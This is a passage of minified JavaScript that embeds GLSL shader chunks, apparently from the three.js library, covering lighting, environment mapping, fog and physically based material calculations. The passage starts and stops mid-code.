	highp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );
	return fract( sin( sn ) * c );
}
#ifdef HIGH_PRECISION
	float precisionSafeLength( vec3 v ) { return length( v ); }
#else
	float precisionSafeLength( vec3 v ) {
		float maxComponent = max3( abs( v ) );
		return length( v / maxComponent ) * maxComponent;
	}
#endif
struct IncidentLight {
	vec3 color;
	vec3 direction;
	bool visible;
};
struct ReflectedLight {
	vec3 directDiffuse;
	vec3 directSpecular;
	vec3 indirectDiffuse;
	vec3 indirectSpecular;
};
#ifdef USE_ALPHAHASH
	varying vec3 vPosition;
#endif
vec3 transformDirection( in vec3 dir, in mat4 matrix ) {
	return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );
}
vec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {
	return normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );
}
bool isPerspectiveMatrix( mat4 m ) {
	return m[ 2 ][ 3 ] == - 1.0;
}
vec2 equirectUv( in vec3 dir ) {
	float u = atan( dir.z, dir.x ) * RECIPROCAL_PI2 + 0.5;
	float v = asin( clamp( dir.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;
	return vec2( u, v );
}
vec3 BRDF_Lambert( const in vec3 diffuseColor ) {
	return RECIPROCAL_PI * diffuseColor;
}
vec3 F_Schlick( const in vec3 f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
}
float F_Schlick( const in float f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
} // validated`,nE=`#ifdef ENVMAP_TYPE_CUBE_UV
	#define cubeUV_minMipLevel 4.0
	#define cubeUV_minTileSize 16.0
	float getFace( vec3 direction ) {
		vec3 absDirection = abs( direction );
		float face = - 1.0;
		if ( absDirection.x > absDirection.z ) {
			if ( absDirection.x > absDirection.y )
				face = direction.x > 0.0 ? 0.0 : 3.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		} else {
			if ( absDirection.z > absDirection.y )
				face = direction.z > 0.0 ? 2.0 : 5.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		}
		return face;
	}
	vec2 getUV( vec3 direction, float face ) {
		vec2 uv;
		if ( face == 0.0 ) {
			uv = vec2( direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 1.0 ) {
			uv = vec2( - direction.x, - direction.z ) / abs( direction.y );
		} else if ( face == 2.0 ) {
			uv = vec2( - direction.x, direction.y ) / abs( direction.z );
		} else if ( face == 3.0 ) {
			uv = vec2( - direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 4.0 ) {
			uv = vec2( - direction.x, direction.z ) / abs( direction.y );
		} else {
			uv = vec2( direction.x, direction.y ) / abs( direction.z );
		}
		return 0.5 * ( uv + 1.0 );
	}
	vec3 bilinearCubeUV( sampler2D envMap, vec3 direction, float mipInt ) {
		float face = getFace( direction );
		float filterInt = max( cubeUV_minMipLevel - mipInt, 0.0 );
		mipInt = max( mipInt, cubeUV_minMipLevel );
		float faceSize = exp2( mipInt );
		highp vec2 uv = getUV( direction, face ) * ( faceSize - 2.0 ) + 1.0;
		if ( face > 2.0 ) {
			uv.y += faceSize;
			face -= 3.0;
		}
		uv.x += face * faceSize;
		uv.x += filterInt * 3.0 * cubeUV_minTileSize;
		uv.y += 4.0 * ( exp2( CUBEUV_MAX_MIP ) - faceSize );
		uv.x *= CUBEUV_TEXEL_WIDTH;
		uv.y *= CUBEUV_TEXEL_HEIGHT;
		#ifdef texture2DGradEXT
			return texture2DGradEXT( envMap, uv, vec2( 0.0 ), vec2( 0.0 ) ).rgb;
		#else
			return texture2D( envMap, uv ).rgb;
		#endif
	}
	#define cubeUV_r0 1.0
	#define cubeUV_m0 - 2.0
	#define cubeUV_r1 0.8
	#define cubeUV_m1 - 1.0
	#define cubeUV_r4 0.4
	#define cubeUV_m4 2.0
	#define cubeUV_r5 0.305
	#define cubeUV_m5 3.0
	#define cubeUV_r6 0.21
	#define cubeUV_m6 4.0
	float roughnessToMip( float roughness ) {
		float mip = 0.0;
		if ( roughness >= cubeUV_r1 ) {
			mip = ( cubeUV_r0 - roughness ) * ( cubeUV_m1 - cubeUV_m0 ) / ( cubeUV_r0 - cubeUV_r1 ) + cubeUV_m0;
		} else if ( roughness >= cubeUV_r4 ) {
			mip = ( cubeUV_r1 - roughness ) * ( cubeUV_m4 - cubeUV_m1 ) / ( cubeUV_r1 - cubeUV_r4 ) + cubeUV_m1;
		} else if ( roughness >= cubeUV_r5 ) {
			mip = ( cubeUV_r4 - roughness ) * ( cubeUV_m5 - cubeUV_m4 ) / ( cubeUV_r4 - cubeUV_r5 ) + cubeUV_m4;
		} else if ( roughness >= cubeUV_r6 ) {
			mip = ( cubeUV_r5 - roughness ) * ( cubeUV_m6 - cubeUV_m5 ) / ( cubeUV_r5 - cubeUV_r6 ) + cubeUV_m5;
		} else {
			mip = - 2.0 * log2( 1.16 * roughness );		}
		return mip;
	}
	vec4 textureCubeUV( sampler2D envMap, vec3 sampleDir, float roughness ) {
		float mip = clamp( roughnessToMip( roughness ), cubeUV_m0, CUBEUV_MAX_MIP );
		float mipF = fract( mip );
		float mipInt = floor( mip );
		vec3 color0 = bilinearCubeUV( envMap, sampleDir, mipInt );
		if ( mipF == 0.0 ) {
			return vec4( color0, 1.0 );
		} else {
			vec3 color1 = bilinearCubeUV( envMap, sampleDir, mipInt + 1.0 );
			return vec4( mix( color0, color1, mipF ), 1.0 );
		}
	}
#endif`,iE=`vec3 transformedNormal = objectNormal;
#ifdef USE_TANGENT
	vec3 transformedTangent = objectTangent;
#endif
#ifdef USE_BATCHING
	mat3 bm = mat3( batchingMatrix );
	transformedNormal /= vec3( dot( bm[ 0 ], bm[ 0 ] ), dot( bm[ 1 ], bm[ 1 ] ), dot( bm[ 2 ], bm[ 2 ] ) );
	transformedNormal = bm * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = bm * transformedTangent;
	#endif
#endif
#ifdef USE_INSTANCING
	mat3 im = mat3( instanceMatrix );
	transformedNormal /= vec3( dot( im[ 0 ], im[ 0 ] ), dot( im[ 1 ], im[ 1 ] ), dot( im[ 2 ], im[ 2 ] ) );
	transformedNormal = im * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = im * transformedTangent;
	#endif
#endif
transformedNormal = normalMatrix * transformedNormal;
#ifdef FLIP_SIDED
	transformedNormal = - transformedNormal;
#endif
#ifdef USE_TANGENT
	transformedTangent = ( modelViewMatrix * vec4( transformedTangent, 0.0 ) ).xyz;
	#ifdef FLIP_SIDED
		transformedTangent = - transformedTangent;
	#endif
#endif`,sE=`#ifdef USE_DISPLACEMENTMAP
	uniform sampler2D displacementMap;
	uniform float displacementScale;
	uniform float displacementBias;
#endif`,rE=`#ifdef USE_DISPLACEMENTMAP
	transformed += normalize( objectNormal ) * ( texture2D( displacementMap, vDisplacementMapUv ).x * displacementScale + displacementBias );
#endif`,aE=`#ifdef USE_EMISSIVEMAP
	vec4 emissiveColor = texture2D( emissiveMap, vEmissiveMapUv );
	#ifdef DECODE_VIDEO_TEXTURE_EMISSIVE
		emissiveColor = sRGBTransferEOTF( emissiveColor );
	#endif
	totalEmissiveRadiance *= emissiveColor.rgb;
#endif`,oE=`#ifdef USE_EMISSIVEMAP
	uniform sampler2D emissiveMap;
#endif`,lE="gl_FragColor = linearToOutputTexel( gl_FragColor );",cE=`vec4 LinearTransferOETF( in vec4 value ) {
	return value;
}
vec4 sRGBTransferEOTF( in vec4 value ) {
	return vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.a );
}
vec4 sRGBTransferOETF( in vec4 value ) {
	return vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );
}`,uE=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vec3 cameraToFrag;
		if ( isOrthographic ) {
			cameraToFrag = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToFrag = normalize( vWorldPosition - cameraPosition );
		}
		vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vec3 reflectVec = reflect( cameraToFrag, worldNormal );
		#else
			vec3 reflectVec = refract( cameraToFrag, worldNormal, refractionRatio );
		#endif
	#else
		vec3 reflectVec = vReflect;
	#endif
	#ifdef ENVMAP_TYPE_CUBE
		vec4 envColor = textureCube( envMap, envMapRotation * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );
	#else
		vec4 envColor = vec4( 0.0 );
	#endif
	#ifdef ENVMAP_BLENDING_MULTIPLY
		outgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );
	#elif defined( ENVMAP_BLENDING_MIX )
		outgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );
	#elif defined( ENVMAP_BLENDING_ADD )
		outgoingLight += envColor.xyz * specularStrength * reflectivity;
	#endif
#endif`,dE=`#ifdef USE_ENVMAP
	uniform float envMapIntensity;
	uniform float flipEnvMap;
	uniform mat3 envMapRotation;
	#ifdef ENVMAP_TYPE_CUBE
		uniform samplerCube envMap;
	#else
		uniform sampler2D envMap;
	#endif
#endif`,hE=`#ifdef USE_ENVMAP
	uniform float reflectivity;
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		varying vec3 vWorldPosition;
		uniform float refractionRatio;
	#else
		varying vec3 vReflect;
	#endif
#endif`,pE=`#ifdef USE_ENVMAP
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		
		varying vec3 vWorldPosition;
	#else
		varying vec3 vReflect;
		uniform float refractionRatio;
	#endif
#endif`,fE=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vWorldPosition = worldPosition.xyz;
	#else
		vec3 cameraToVertex;
		if ( isOrthographic ) {
			cameraToVertex = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToVertex = normalize( worldPosition.xyz - cameraPosition );
		}
		vec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vReflect = reflect( cameraToVertex, worldNormal );
		#else
			vReflect = refract( cameraToVertex, worldNormal, refractionRatio );
		#endif
	#endif
#endif`,mE=`#ifdef USE_FOG
	vFogDepth = - mvPosition.z;
#endif`,gE=`#ifdef USE_FOG
	varying float vFogDepth;
#endif`,vE=`#ifdef USE_FOG
	#ifdef FOG_EXP2
		float fogFactor = 1.0 - exp( - fogDensity * fogDensity * vFogDepth * vFogDepth );
	#else
		float fogFactor = smoothstep( fogNear, fogFar, vFogDepth );
	#endif
	gl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );
#endif`,yE=`#ifdef USE_FOG
	uniform vec3 fogColor;
	varying float vFogDepth;
	#ifdef FOG_EXP2
		uniform float fogDensity;
	#else
		uniform float fogNear;
		uniform float fogFar;
	#endif
#endif`,xE=`#ifdef USE_GRADIENTMAP
	uniform sampler2D gradientMap;
#endif
vec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {
	float dotNL = dot( normal, lightDirection );
	vec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );
	#ifdef USE_GRADIENTMAP
		return vec3( texture2D( gradientMap, coord ).r );
	#else
		vec2 fw = fwidth( coord ) * 0.5;
		return mix( vec3( 0.7 ), vec3( 1.0 ), smoothstep( 0.7 - fw.x, 0.7 + fw.x, coord.x ) );
	#endif
}`,_E=`#ifdef USE_LIGHTMAP
	uniform sampler2D lightMap;
	uniform float lightMapIntensity;
#endif`,bE=`LambertMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularStrength = specularStrength;`,SE=`varying vec3 vViewPosition;
struct LambertMaterial {
	vec3 diffuseColor;
	float specularStrength;
};
void RE_Direct_Lambert( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Lambert( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Lambert
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Lambert`,wE=`uniform bool receiveShadow;
uniform vec3 ambientLightColor;
#if defined( USE_LIGHT_PROBES )
	uniform vec3 lightProbe[ 9 ];
#endif
vec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {
	float x = normal.x, y = normal.y, z = normal.z;
	vec3 result = shCoefficients[ 0 ] * 0.886227;
	result += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;
	result += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;
	result += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;
	result += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;
	result += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;
	result += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );
	result += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;
	result += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );
	return result;
}
vec3 getLightProbeIrradiance( const in vec3 lightProbe[ 9 ], const in vec3 normal ) {
	vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
	vec3 irradiance = shGetIrradianceAt( worldNormal, lightProbe );
	return irradiance;
}
vec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {
	vec3 irradiance = ambientLightColor;
	return irradiance;
}
float getDistanceAttenuation( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {
	float distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );
	if ( cutoffDistance > 0.0 ) {
		distanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );
	}
	return distanceFalloff;
}
float getSpotAttenuation( const in float coneCosine, const in float penumbraCosine, const in float angleCosine ) {
	return smoothstep( coneCosine, penumbraCosine, angleCosine );
}
#if NUM_DIR_LIGHTS > 0
	struct DirectionalLight {
		vec3 direction;
		vec3 color;
	};
	uniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];
	void getDirectionalLightInfo( const in DirectionalLight directionalLight, out IncidentLight light ) {
		light.color = directionalLight.color;
		light.direction = directionalLight.direction;
		light.visible = true;
	}
#endif
#if NUM_POINT_LIGHTS > 0
	struct PointLight {
		vec3 position;
		vec3 color;
		float distance;
		float decay;
	};
	uniform PointLight pointLights[ NUM_POINT_LIGHTS ];
	void getPointLightInfo( const in PointLight pointLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = pointLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float lightDistance = length( lVector );
		light.color = pointLight.color;
		light.color *= getDistanceAttenuation( lightDistance, pointLight.distance, pointLight.decay );
		light.visible = ( light.color != vec3( 0.0 ) );
	}
#endif
#if NUM_SPOT_LIGHTS > 0
	struct SpotLight {
		vec3 position;
		vec3 direction;
		vec3 color;
		float distance;
		float decay;
		float coneCos;
		float penumbraCos;
	};
	uniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];
	void getSpotLightInfo( const in SpotLight spotLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = spotLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float angleCos = dot( light.direction, spotLight.direction );
		float spotAttenuation = getSpotAttenuation( spotLight.coneCos, spotLight.penumbraCos, angleCos );
		if ( spotAttenuation > 0.0 ) {
			float lightDistance = length( lVector );
			light.color = spotLight.color * spotAttenuation;
			light.color *= getDistanceAttenuation( lightDistance, spotLight.distance, spotLight.decay );
			light.visible = ( light.color != vec3( 0.0 ) );
		} else {
			light.color = vec3( 0.0 );
			light.visible = false;
		}
	}
#endif
#if NUM_RECT_AREA_LIGHTS > 0
	struct RectAreaLight {
		vec3 color;
		vec3 position;
		vec3 halfWidth;
		vec3 halfHeight;
	};
	uniform sampler2D ltc_1;	uniform sampler2D ltc_2;
	uniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];
#endif
#if NUM_HEMI_LIGHTS > 0
	struct HemisphereLight {
		vec3 direction;
		vec3 skyColor;
		vec3 groundColor;
	};
	uniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];
	vec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in vec3 normal ) {
		float dotNL = dot( normal, hemiLight.direction );
		float hemiDiffuseWeight = 0.5 * dotNL + 0.5;
		vec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );
		return irradiance;
	}
#endif`,ME=`#ifdef USE_ENVMAP
	vec3 getIBLIrradiance( const in vec3 normal ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, envMapRotation * worldNormal, 1.0 );
			return PI * envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	vec3 getIBLRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 reflectVec = reflect( - viewDir, normal );
			reflectVec = normalize( mix( reflectVec, normal, pow4( roughness ) ) );
			reflectVec = inverseTransformDirection( reflectVec, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, envMapRotation * reflectVec, roughness );
			return envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	#ifdef USE_ANISOTROPY
		vec3 getIBLAnisotropyRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness, const in vec3 bitangent, const in float anisotropy ) {
			#ifdef ENVMAP_TYPE_CUBE_UV
				vec3 bentNormal = cross( bitangent, viewDir );
				bentNormal = normalize( cross( bentNormal, bitangent ) );
				bentNormal = normalize( mix( bentNormal, normal, pow2( pow2( 1.0 - anisotropy * ( 1.0 - roughness ) ) ) ) );
				return getIBLRadiance( viewDir, bentNormal, roughness );
			#else
				return vec3( 0.0 );
			#endif
		}
	#endif
#endif`,EE=`ToonMaterial material;
material.diffuseColor = diffuseColor.rgb;`,TE=`varying vec3 vViewPosition;
struct ToonMaterial {
	vec3 diffuseColor;
};
void RE_Direct_Toon( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	vec3 irradiance = getGradientIrradiance( geometryNormal, directLight.direction ) * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Toon( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Toon
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Toon`,AE=`BlinnPhongMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularColor = specular;
material.specularShininess = shininess;
material.specularStrength = specularStrength;`,CE=`varying vec3 vViewPosition;
struct BlinnPhongMaterial {
	vec3 diffuseColor;
	vec3 specularColor;
	float specularShininess;
	float specularStrength;
};
void RE_Direct_BlinnPhong( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
	reflectedLight.directSpecular += irradiance * BRDF_BlinnPhong( directLight.direction, geometryViewDir, geometryNormal, material.specularColor, material.specularShininess ) * material.specularStrength;
}
void RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_BlinnPhong
#define RE_IndirectDiffuse		RE_IndirectDiffuse_BlinnPhong`,RE=`PhysicalMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.diffuseContribution = diffuseColor.rgb * ( 1.0 - metalnessFactor );
material.metalness = metalnessFactor;
vec3 dxy = max( abs( dFdx( nonPerturbedNormal ) ), abs( dFdy( nonPerturbedNormal ) ) );
float geometryRoughness = max( max( dxy.x, dxy.y ), dxy.z );
material.roughness = max( roughnessFactor, 0.0525 );material.roughness += geometryRoughness;
material.roughness = min( material.roughness, 1.0 );
#ifdef IOR
	material.ior = ior;
	#ifdef USE_SPECULAR
		float specularIntensityFactor = specularIntensity;
		vec3 specularColorFactor = specularColor;
		#ifdef USE_SPECULAR_COLORMAP
			specularColorFactor *= texture2D( specularColorMap, vSpecularColorMapUv ).rgb;
		#endif
		#ifdef USE_SPECULAR_INTENSITYMAP
			specularIntensityFactor *= texture2D( specularIntensityMap, vSpecularIntensityMapUv ).a;
		#endif
		material.specularF90 = mix( specularIntensityFactor, 1.0, metalnessFactor );
	#else
		float specularIntensityFactor = 1.0;
		vec3 specularColorFactor = vec3( 1.0 );
		material.specularF90 = 1.0;
	#endif
	material.specularColor = min( pow2( ( material.ior - 1.0 ) / ( material.ior + 1.0 ) ) * specularColorFactor, vec3( 1.0 ) ) * specularIntensityFactor;
	material.specularColorBlended = mix( material.specularColor, diffuseColor.rgb, metalnessFactor );
#else
	material.specularColor = vec3( 0.04 );
	material.specularColorBlended = mix( material.specularColor, diffuseColor.rgb, metalnessFactor );
	material.specularF90 = 1.0;
#endif
#ifdef USE_CLEARCOAT
	material.clearcoat = clearcoat;
	material.clearcoatRoughness = clearcoatRoughness;
	material.clearcoatF0 = vec3( 0.04 );
	material.clearcoatF90 = 1.0;
	#ifdef USE_CLEARCOATMAP
		material.clearcoat *= texture2D( clearcoatMap, vClearcoatMapUv ).x;
	#endif
	#ifdef USE_CLEARCOAT_ROUGHNESSMAP
		material.clearcoatRoughness *= texture2D( clearcoatRoughnessMap, vClearcoatRoughnessMapUv ).y;
	#endif
	material.clearcoat = saturate( material.clearcoat );	material.clearcoatRoughness = max( material.clearcoatRoughness, 0.0525 );
	material.clearcoatRoughness += geometryRoughness;
	material.clearcoatRoughness = min( material.clearcoatRoughness, 1.0 );
#endif
#ifdef USE_DISPERSION
	material.dispersion = dispersion;
#endif
#ifdef USE_IRIDESCENCE
	material.iridescence = iridescence;
	material.iridescenceIOR = iridescenceIOR;
	#ifdef USE_IRIDESCENCEMAP
		material.iridescence *= texture2D( iridescenceMap, vIridescenceMapUv ).r;
	#endif
	#ifdef USE_IRIDESCENCE_THICKNESSMAP
		material.iridescenceThickness = (iridescenceThicknessMaximum - iridescenceThicknessMinimum) * texture2D( iridescenceThicknessMap, vIridescenceThicknessMapUv ).g + iridescenceThicknessMinimum;
	#else
		material.iridescenceThickness = iridescenceThicknessMaximum;
	#endif
#endif
#ifdef USE_SHEEN
	material.sheenColor = sheenColor;
	#ifdef USE_SHEEN_COLORMAP
		material.sheenColor *= texture2D( sheenColorMap, vSheenColorMapUv ).rgb;
	#endif
	material.sheenRoughness = clamp( sheenRoughness, 0.0001, 1.0 );
	#ifdef USE_SHEEN_ROUGHNESSMAP
		material.sheenRoughness *= texture2D( sheenRoughnessMap, vSheenRoughnessMapUv ).a;
	#endif
#endif
#ifdef USE_ANISOTROPY
	#ifdef USE_ANISOTROPYMAP
		mat2 anisotropyMat = mat2( anisotropyVector.x, anisotropyVector.y, - anisotropyVector.y, anisotropyVector.x );
		vec3 anisotropyPolar = texture2D( anisotropyMap, vAnisotropyMapUv ).rgb;
		vec2 anisotropyV = anisotropyMat * normalize( 2.0 * anisotropyPolar.rg - vec2( 1.0 ) ) * anisotropyPolar.b;
	#else
		vec2 anisotropyV = anisotropyVector;
	#endif
	material.anisotropy = length( anisotropyV );
	if( material.anisotropy == 0.0 ) {
		anisotropyV = vec2( 1.0, 0.0 );
	} else {
		anisotropyV /= material.anisotropy;
		material.anisotropy = saturate( material.anisotropy );
	}
	material.alphaT = mix( pow2( material.roughness ), 1.0, pow2( material.anisotropy ) );
	material.anisotropyT = tbn[ 0 ] * anisotropyV.x + tbn[ 1 ] * anisotropyV.y;
	material.anisotropyB = tbn[ 1 ] * anisotropyV.x - tbn[ 0 ] * anisotropyV.y;
#endif`,kE=`uniform sampler2D dfgLUT;
struct PhysicalMaterial {
	vec3 diffuseColor;
	vec3 diffuseContribution;
	vec3 specularColor;
	vec3 specularColorBlended;
	float roughness;
	float metalness;
	float specularF90;
	float dispersion;
	#ifdef USE_CLEARCOAT
		float clearcoat;
		float clearcoatRoughness;
		vec3 clearcoatF0;
		float clearcoatF90;
	#endif
	#ifdef USE_IRIDESCENCE
		float iridescence;
		float iridescenceIOR;
		float iridescenceThickness;
		vec3 iridescenceFresnel;
		vec3 iridescenceF0;
		vec3 iridescenceFresnelDielectric;
		vec3 iridescenceFresnelMetallic;
	#endif
	#ifdef USE_SHEEN
		vec3 sheenColor;
		float sheenRoughness;
	#endif
	#ifdef IOR
		float ior;
	#endif
	#ifdef USE_TRANSMISSION
		float transmission;
		float transmissionAlpha;
		float thickness;
		float attenuationDistance;
		vec3 attenuationColor;
	#endif
	#ifdef USE_ANISOTROPY
		float anisotropy;
		float alphaT;
		vec3 anisotropyT;
		vec3 anisotropyB;
	#endif
};
vec3 clearcoatSpecularDirect = vec3( 0.0 );
vec3 clearcoatSpecularIndirect = vec3( 0.0 );
vec3 sheenSpecularDirect = vec3( 0.0 );
vec3 sheenSpecularIndirect = vec3(0.0 );
vec3 Schlick_to_F0( const in vec3 f, const in float f90, const in float dotVH ) {
    float x = clamp( 1.0 - dotVH, 0.0, 1.0 );
    float x2 = x * x;
    float x5 = clamp( x * x2 * x2, 0.0, 0.9999 );
    return ( f - vec3( f90 ) * x5 ) / ( 1.0 - x5 );
}
float V_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {
	float a2 = pow2( alpha );
	float gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );
	float gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );
	return 0.5 / max( gv + gl, EPSILON );
}
float D_GGX( const in float alpha, const in float dotNH ) {
	float a2 = pow2( alpha );
	float denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;
	return RECIPROCAL_PI * a2 / pow2( denom );
}
#ifdef USE_ANISOTROPY
	float V_GGX_SmithCorrelated_Anisotropic( const in float alphaT, const in float alphaB, const in float dotTV, const in float dotBV, const in float dotTL, const in float dotBL, const in float dotNV, const in float dotNL ) {
		float gv = dotNL * length( vec3( alphaT * dotTV, alphaB * dotBV, dotNV ) );
		float gl = dotNV * length( vec3( alphaT * dotTL, alphaB * dotBL, dotNL ) );
		float v = 0.5 / ( gv + gl );
		return v;
	}
	float D_GGX_Anisotropic( const in float alphaT, const in float alphaB, const in float dotNH, const in float dotTH, const in float dotBH ) {
		float a2 = alphaT * alphaB;
		highp vec3 v = vec3( alphaB * dotTH, alphaT * dotBH, a2 * dotNH );
		highp float v2 = dot( v, v );
		float w2 = a2 / v2;
		return RECIPROCAL_PI * a2 * pow2 ( w2 );
	}
#endif
#ifdef USE_CLEARCOAT
	vec3 BRDF_GGX_Clearcoat( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material) {
		vec3 f0 = material.clearcoatF0;
		float f90 = material.clearcoatF90;
		float roughness = material.clearcoatRoughness;
		float alpha = pow2( roughness );
		vec3 halfDir = normalize( lightDir + viewDir );
		float dotNL = saturate( dot( normal, lightDir ) );
		float dotNV = saturate( dot( normal, viewDir ) );
		float dotNH = saturate( dot( normal, halfDir ) );
		float dotVH = saturate( dot( viewDir, halfDir ) );
		vec3 F = F_Schlick( f0, f90, dotVH );
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
		return F * ( V * D );
	}
#endif
vec3 BRDF_GGX( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material ) {
	vec3 f0 = material.specularColorBlended;
